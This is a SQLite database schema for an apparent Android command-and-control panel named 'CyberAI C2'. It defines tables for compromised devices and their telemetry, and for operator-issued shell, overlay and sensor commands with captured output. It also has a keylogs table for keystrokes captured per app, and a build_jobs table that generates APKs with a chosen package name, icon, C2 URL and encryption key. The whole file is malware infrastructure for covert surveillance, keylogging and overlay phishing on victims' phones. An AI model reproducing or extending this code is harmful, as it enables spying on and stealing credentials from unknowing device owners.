-- CyberAI C2 Database Schema
-- SQLite — runs on `node db/migrate.js`

PRAGMA journal_mode = WAL;
PRAGMA foreign_keys = ON;

-- ================================================================== Users
CREATE TABLE IF NOT EXISTS users (
    id            TEXT PRIMARY KEY,
    username      TEXT NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,
    role          TEXT NOT NULL DEFAULT 'operator' CHECK(role IN ('admin','operator','viewer')),
    created_at    TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    last_login_at TEXT
);

-- ================================================================ Devices
CREATE TABLE IF NOT EXISTS devices (
    id              TEXT PRIMARY KEY,           -- uuid
    token           TEXT NOT NULL UNIQUE,        -- device auth token
    name            TEXT,                        -- friendly name
    group_id        TEXT,
    -- Device info (from telemetry)
    manufacturer    TEXT,
    model           TEXT,
    android_version TEXT,
    sdk_version     INTEGER,
    security_patch  TEXT,
    carrier         TEXT,
    -- Network
    public_ip       TEXT,
    local_ip        TEXT,
    signal_strength INTEGER,
    -- Status
    is_online       INTEGER NOT NULL DEFAULT 0,
    last_seen_at    TEXT,
    first_seen_at   TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    -- Capabilities (bitfield or JSON)
    capabilities    TEXT DEFAULT '{}',
    battery_level   INTEGER DEFAULT -1,
    is_charging     INTEGER DEFAULT 0,
    -- Metadata
    country         TEXT,
    tags            TEXT DEFAULT '[]',           -- JSON array
    notes           TEXT,
    FOREIGN KEY (group_id) REFERENCES device_groups(id) ON DELETE SET NULL
);

CREATE INDEX idx_devices_online ON devices(is_online);
CREATE INDEX idx_devices_group ON devices(group_id);

-- ============================================================= Device Groups
CREATE TABLE IF NOT EXISTS device_groups (
    id          TEXT PRIMARY KEY,
    name        TEXT NOT NULL UNIQUE,
    description TEXT,
    created_at  TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now'))
);

-- =============================================================== Commands
CREATE TABLE IF NOT EXISTS commands (
    id          TEXT PRIMARY KEY,
    device_id   TEXT NOT NULL,
    type        TEXT NOT NULL,                  -- 'shell','broadcast','overlay','sensor',etc
    payload     TEXT NOT NULL,                   -- JSON or raw command string
    status      TEXT NOT NULL DEFAULT 'pending' CHECK(status IN ('pending','sent','delivered','completed','failed','timeout')),
    created_at  TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    sent_at     TEXT,
    result_at   TEXT,
    result      TEXT,                            -- stdout / result payload
    error       TEXT,
    operator_id TEXT,
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    FOREIGN KEY (operator_id) REFERENCES users(id) ON DELETE SET NULL
);

CREATE INDEX idx_commands_device ON commands(device_id);
CREATE INDEX idx_commands_status ON commands(status);

-- ================================================================ Audit Log
CREATE TABLE IF NOT EXISTS audit_logs (
    id          TEXT PRIMARY KEY,
    user_id     TEXT,
    action      TEXT NOT NULL,                  -- 'login','command','build','delete_device',etc
    target_type TEXT,                            -- 'device','user','build','group'
    target_id   TEXT,
    details     TEXT,                            -- JSON extra info
    ip          TEXT,
    created_at  TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL
);

CREATE INDEX idx_audit_created ON audit_logs(created_at);

-- ================================================================= Keylogs
CREATE TABLE IF NOT EXISTS keylogs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id   TEXT NOT NULL,
    package_name TEXT,
    key_event   TEXT,
    text        TEXT,
    captured_at TEXT NOT NULL,
    received_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

CREATE INDEX idx_keylogs_device ON keylogs(device_id);

-- ================================================================ Build Jobs
CREATE TABLE IF NOT EXISTS build_jobs (
    id              TEXT PRIMARY KEY,
    status          TEXT NOT NULL DEFAULT 'queued' CHECK(status IN ('queued','running','success','failed')),
    package_name    TEXT,
    icon_url        TEXT,
    build_config    TEXT NOT NULL DEFAULT 'release',
    c2_url          TEXT NOT NULL,
    encryption_key  TEXT NOT NULL,
    workflow_run_id TEXT,
    apk_url         TEXT,                        -- Download URL after build
    error           TEXT,
    requested_by    TEXT,
    created_at      TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    completed_at    TEXT,
    FOREIGN KEY (requested_by) REFERENCES users(id) ON DELETE SET NULL
);
